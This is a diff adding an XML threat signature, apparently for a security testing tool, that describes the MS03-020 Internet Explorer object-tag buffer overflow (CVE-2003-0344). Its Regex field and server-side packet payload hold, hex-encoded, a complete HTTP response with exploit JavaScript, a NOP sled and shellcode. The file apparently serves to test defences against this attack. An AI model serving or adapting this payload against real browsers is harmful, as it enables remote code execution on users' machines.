@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MS03-020 Buffer Overflow in Object Type"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in Internet Explorer, allowing a malicious website to execute code.  This is caused by a flaw in the Object tag.  This threat is a client attack that comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_6.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.eeye.com/html/research/advisories/AD20030604.html"/>
+    <CVEID display="true" value="CVE-2003-0344"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="2967"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000102af51138800c000a80001003c080b8a15"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200103437500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X48\X54\X54\X50\X2F\X31\X2E\X30\X20\X32\X30\X30\X20\X4F\X6B\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X74\X65\X78\X74\X2F\X68\X74\X6D\X6C\X0A\X0A\X3C\X73\X63\X72\X69\X70\X74\X3E\X0A\X09\X76\X61\X72\X20\X6D\X69\X6E\X73\X20\X3D\X20\X35\X36\X3B\X0A\X09\X76\X61\X72\X20\X73\X69\X7A\X65\X20\X3D\X20\X34\X38\X3B\X0A\X09\X76\X61\X72\X20\X73\X70\X6C\X6F\X69\X74\X20\X3D\X20\X22\X33\XDB\X8B\XD4\X80\XC6\XFF\XC7\X42\XFC\X63\X6D\X64\X01\X88\X5A\XFF\X8D\X42\XFC\X8B\XF5\X56\X52\X53\X53\X53\X53\X53\X53\X50\X53\XB8\X41\X77\XF7\XBF\XFF\XD0\XB8\XF8\XD4\XF8\XBF\XFF\XD0\XCC\X22\X3B\X0A\X09\X76\X61\X72\X20\X73\X74\X72\X4E\X6F\X70\X20\X3D\X20\X22\X90\X22\X3B\X0A\X09\X76\X61\X72\X20\X73\X74\X72\X4F\X62\X6A\X20\X3D\X20\X27\X3C\X6F\X62\X6A\X65\X63\X74\X20\X74\X79\X70\X65\X3D\X22\X27\X3B\X0A\X09\X66\X6F\X72\X20\X28\X69\X3D\X30\X3B\X69\X3C\X6D\X69\X6E\X73\X2D\X73\X70\X6C\X6F\X69\X74\X2E\X6C\X65\X6E\X67\X74\X68\X3B\X69\X2B\X2B\X29\X20\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X73\X74\X72\X4E\X6F\X70\X3B\X0A\X09\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X73\X70\X6C\X6F\X69\X74\X3B\X0A\X09\X66\X6F\X72\X20\X28\X69\X3D\X30\X3B\X69\X3C\X73\X69\X7A\X65\X3B\X69\X2B\X2B\X29\X20\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X27\X2F\X27\X3B\X0A\X09\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X22\X43\X43\X43\X43\X43\X43\X43\X43\X44\X44\X44\X44\X44\X44\X44\X44\X22\X3B\X0A\X09\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X22\X5C\X78\X41\X42\X5C\X78\X35\X44\X5C\X78\X35\X38\X22\X3B\X0A\X09\X73\X74\X72\X4F\X62\X6A\X20\X2B\X3D\X20\X27\X22\X3E\X48\X65\X6C\X6C\X6F\X5C\X3C\X2F\X6F\X62\X6A\X65\X63\X74\X3E\X27\X3B\X0A\X09\X61\X6C\X65\X72\X74\X28\X73\X74\X72\X4F\X62\X6A\X29\X3B\X0A\X09\X64\X6F\X63\X75\X6D\X65\X6E\X74\X2E\X77\X72\X69\X74\X65\X28\X73\X74\X72\X4F\X62\X6A\X29\X3B\X0A\X3C\X2F\X73\X63\X72\X69\X70\X74\X3E"/>
+    <Created value="1139462252" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3020323030204F6B0A436F6E74656E742D547970653A20746578742F68746D6C0A0A3C7363726970743E0A09766172206D696E73203D2035363B0A097661722073697A65203D2034383B0A097661722073706C6F6974203D202233DB8BD480C6FFC742FC636D6401885AFF8D42FC8BF556525353535353535053B84177F7BFFFD0B8F8D4F8BFFFD0CC223B0A09766172207374724E6F70203D202290223B0A09766172207374724F626A203D20273C6F626A65637420747970653D22273B0A09666F722028693D303B693C6D696E732D73706C6F69742E6C656E6774683B692B2B29207374724F626A202B3D207374724E6F703B0A097374724F626A202B3D2073706C6F69743B0A09666F722028693D303B693C73697A653B692B2B29207374724F626A202B3D20272F273B0A097374724F626A202B3D202243434343434343434444444444444444223B0A097374724F626A202B3D20225C7841425C7835445C783538223B0A097374724F626A202B3D2027223E48656C6C6F5C3C2F6F626A6563743E273B0A09616C657274287374724F626A293B0A09646F63756D656E742E7772697465287374724F626A293B0A3C2F7363726970743E" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
